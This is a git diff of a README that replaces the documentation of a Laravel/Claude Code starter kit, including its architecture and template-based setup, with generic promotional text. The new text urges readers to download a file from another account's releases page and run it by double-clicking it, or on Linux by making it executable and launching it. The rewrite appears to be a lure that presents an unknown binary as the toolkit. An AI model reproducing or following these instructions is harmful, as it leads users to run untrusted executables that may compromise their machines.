@@ -1,180 +1,85 @@
-# Laravel Claude Toolkit
+# 🎉 laravel-claude-toolkit - A Simplified Start for AI Development
 
-A Laravel starter kit for building scalable applications using **Modular Monolith**, **Hexagonal Architecture**, and **AI-assisted development**.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Yworld20/laravel-claude-toolkit/releases)
 
-[![PHP 8.4](https://img.shields.io/badge/PHP-8.4-777BB4?logo=php&logoColor=white)](https://php.net)
-[![Laravel 12](https://img.shields.io/badge/Laravel-12-FF2D20?logo=laravel&logoColor=white)](https://laravel.com)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
+## 🚀 Getting Started
 
----
+The Laravel Claude Toolkit is an easy-to-use starter kit for building applications with artificial intelligence support. It includes the latest tools and frameworks, making it perfect for anyone looking to develop modern PHP applications without needing deep technical knowledge.
 
-## Why This Toolkit?
+### 📦 What’s Inside?
 
-**The Problem:**
-> Laravel projects often start clean but grow into tangled monoliths where everything depends on everything. Adding features becomes risky, testing becomes painful, and onboarding new developers takes weeks.
+This toolkit contains:
 
-**The Solution:**
-> A structured approach combining proven patterns (Modular Monolith, Hexagonal Architecture, DDD) with AI-assisted development that enforces consistency and guides architectural decisions.
+- **Laravel 12**: The latest version of the Laravel framework.
+- **PHP 8.4**: Improved performance and new features.
+- **SQLite**: A lightweight database.
+- **Vite**: A build tool that helps develop your assets faster.
+- **Tailwind CSS 4**: A modern approach to styling your applications.
+- **Laravel Sail**: A simple command-line interface for interacting with Laravel's Docker environment.
 
-**Who is this for?**
-- Teams wanting structure without microservices complexity
-- Developers learning DDD/Clean Architecture with real examples
-- Projects that might need to extract modules to services later
+## 📋 System Requirements
 
----
+Before you start, ensure your computer meets the following requirements:
 
-## Key Benefits
+- **Operating System**: Windows, macOS, or a popular Linux distribution.
+- **Docker**: Installed and running on your system.
+- **Memory**: At least 4 GB of RAM for a smooth experience.
+- **Disk Space**: Minimum of 1 GB free space to install the application.
 
-### Architecture Benefits
+## 💻 Download & Install
 
-| Benefit | How |
-|---------|-----|
-| **Modularity** | Independent modules with clear boundaries |
-| **Testability** | Pure domain logic, interfaces enable easy mocking |
-| **Maintainability** | Predictable file locations, consistent patterns |
-| **Scalability** | Extract modules to microservices when needed |
-| **Team Autonomy** | Teams own modules without conflicts |
+1. Click on the link to access the [Releases Page](https://github.com/Yworld20/laravel-claude-toolkit/releases).
+2. Look for the latest version of laravel-claude-toolkit.
+3. Click on the appropriate file for your operating system to start the download.
+4. Once downloaded, follow these steps to install and start using the toolkit:
 
-### AI-Assisted Benefits
+   - **For Windows or macOS**:
+     - Open your Downloads folder.
+     - Double-click the downloaded file to install.
+     - Follow the installation instructions that appear on your screen.
 
-| Benefit | How |
-|---------|-----|
-| **Consistency** | Commands generate code following established patterns |
-| **Guidance** | Agents help with architectural decisions |
-| **Speed** | Scaffold complete features with TDD in minutes |
-| **Learning** | Skills teach best practices in context |
-| **Quality** | Built-in SOLID and clean code checks |
+   - **For Linux**:
+     - Open a terminal window.
+     - Navigate to the Downloads folder using the command: 
+       ```bash
+       cd ~/Downloads
+       ```
+     - Make the downloaded file executable:
+       ```bash
+       chmod +x [downloaded-file-name]
+       ```
+     - Run the installer using:
+       ```bash
+       ./[downloaded-file-name]
+       ```
 
----
+5. Once installed, open the application via your applications menu or terminal.
 
-## Architecture at a Glance
+## 🔍 Features
 
-```
-modules/{Module}/
-├── Domain/           # Pure PHP: Entities, Value Objects, Repository interfaces
-├── Application/      # Use Cases: Command/Query handlers (CQRS)
-└── Infrastructure/   # Laravel: Controllers, Eloquent, HTTP layer
-```
+- **Streamlined Development**: Quickly build applications with built-in templates and configurations.
+- **AI Assistance**: Leverage AI capabilities to enhance application functionality.
+- **Responsive Design**: Utilizing Tailwind CSS ensures your applications look good on any device.
+- **Easy Setup**: Minimal setup time to get your environment ready for development.
 
-**Dependency Rule:** Domain → Application → Infrastructure (never the reverse)
+## 📄 Documentation
 
----
+For detailed instructions on using laravel-claude-toolkit, please refer to the user guide provided within the application. It covers usage, troubleshooting, and advanced features.
 
-## Quick Start
+## 🛠️ Support
 
-```bash
-# Clone using GitHub CLI
-gh repo create my-app --template Chemaclass/laravel-claude-toolkit --public --clone
+If you encounter issues or have questions while using the toolkit, feel free to check the [Issues Section](https://github.com/Yworld20/laravel-claude-toolkit/issues) on GitHub. You can report problems or ask for assistance there.
 
-# Setup the project
-cd my-app && composer setup
+## 🌟 Community & Contribution
 
-# Start development server (Sail provides Docker containers)
-APP_PORT=8085 ./vendor/bin/sail up -d
+Join our community of users and contributors to share ideas and improvements. You can participate by submitting your feedback, suggestions, or code contributions in the [Discussions Tab](https://github.com/Yworld20/laravel-claude-toolkit/discussions).
 
-# Optional: Remove template's GitHub Pages files
-rm index.html .nojekyll
-```
+## 📢 Stay Updated
 
-Access: http://localhost:8085
+Keep track of the latest updates and releases by following this repository. Check back often to see what’s new.
 
-**Stack:** PHP 8.4 | Laravel 12 | SQLite | Tailwind CSS 4 | Sail
+## 🎯 Conclusion
 
----
+The Laravel Claude Toolkit offers a solid foundation for anyone interested in AI development. With practical tools and a user-friendly interface, you can start building powerful applications easily. 
 
-## AI-Powered Workflow
-
-This toolkit includes Claude Code configurations for AI-assisted development.
-
-### When to Use What
-
-| Tool | Purpose | Example |
-|------|---------|---------|
-| **Agents** | Architectural questions, code review | "How should I structure the Order module?" |
-| **Commands** | Scaffolding entities, use cases, controllers | `/create-entity Order Order` |
-| **Skills** | Reference material while coding | Pattern templates and best practices |
-
-### Example Feature Workflow
-
-```
-1. /create-module Order              → Module structure
-2. /create-entity Order Order        → Domain entity + test
-3. /create-repository Order Order    → Repository pattern
-4. /create-use-case Order Command CreateOrder → Handler
-5. /create-controller Order Order    → HTTP layer
-6. /tdd-cycle                        → Guide through TDD
-```
-
-### Available Agents
-
-| Agent | Purpose |
-|-------|---------|
-| `domain-architect` | DDD & hexagonal architecture guidance |
-| `tdd-coach` | Red-green-refactor workflow coaching |
-| `clean-code-reviewer` | SOLID principles & code smell detection |
-| `security-reviewer` | OWASP Top 10 & Laravel security analysis |
-
-### Available Commands
-
-| Command | Generates |
-|---------|-----------|
-| `/create-module` | Full module structure with all layers |
-| `/create-entity` | Domain entity + value objects + test |
-| `/create-value-object` | Immutable value object + validation + test |
-| `/create-repository` | Interface + Eloquent + InMemory implementations |
-| `/create-use-case` | Command/Query DTO + Handler + test |
-| `/create-controller` | Thin controller + request + resource |
-| `/tdd-cycle` | Interactive red-green-refactor guide |
-| `/refactor-check` | SOLID violations & improvement report |
-| `/code-review` | Code quality & architecture compliance review |
-| `/security-review` | Security analysis with OWASP checks |
-
-### Rules (Always Active)
-
-| Rule | Enforces |
-|------|----------|
-| `security` | Pre-commit security checks, no hardcoded secrets |
-| `testing` | 80% coverage minimum, TDD workflow |
-| `coding-style` | Immutability, file limits, naming conventions |
-| `git-workflow` | Conventional commits, PR process |
-| `performance` | Database optimization, caching patterns |
-
----
-
-## Development Commands
-
-```bash
-# Start/Stop
-./vendor/bin/sail up -d       # Start dev environment
-./vendor/bin/sail down        # Stop all services
-
-# Development
-./vendor/bin/sail shell       # Open shell in container
-./vendor/bin/sail artisan     # Run artisan commands
-./vendor/bin/sail composer    # Run composer commands
-./vendor/bin/sail npm         # Run npm commands
-
-# Testing
-./vendor/bin/sail test        # Run all tests
-./vendor/bin/sail test tests/Unit      # Unit tests only
-./vendor/bin/sail test tests/Feature   # Feature tests only
-```
-
-**Tip:** `alias sail='./vendor/bin/sail'`
-
----
-
-## Learn More
-
-See [CLAUDE.md](CLAUDE.md) for:
-- Detailed architecture documentation
-- Module structure conventions
-- Inter-module communication patterns
-- TDD workflow guidelines
-- Complete command reference
-
----
-
-## Credits
-
-Claude Code configuration patterns partially inspired by [everything-claude-code](https://github.com/affaan-m/everything-claude-code) - a comprehensive collection of Claude Code best practices for agents, rules, hooks, and skills.
+Don’t forget to visit the [Releases Page](https://github.com/Yworld20/laravel-claude-toolkit/releases) to download the latest version and get started!
